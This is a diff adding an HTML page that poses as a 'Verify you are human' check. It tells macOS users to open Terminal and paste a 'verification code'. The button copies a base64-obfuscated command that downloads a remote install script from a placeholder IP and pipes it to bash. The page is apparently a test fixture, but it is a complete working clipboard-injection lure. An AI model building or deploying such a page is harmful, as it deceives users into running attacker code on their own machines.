@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Verify</title>
+  </head>
+  <body>
+    <h2>Verify you are human</h2>
+    <p>macOS users: Press Command + Space, type Terminal and press Enter. Then press Command + V and press Enter.</p>
+    <button id="copy">Copy verification code</button>
+    <script>
+      const payload = 'echo "Y3VybCAtZnNTTCBodHRwOi8vMTkyLjAuMi4xMC9pbnN0YWxsLnNoIHwgYmFzaA==" | base64 -d | bash';
+      document.getElementById('copy').addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(payload);
+          document.title = 'written';
+        } catch (e) {
+          document.title = 'error ' + e;
+        }
+      });
+    </script>
+  </body>
+</html>
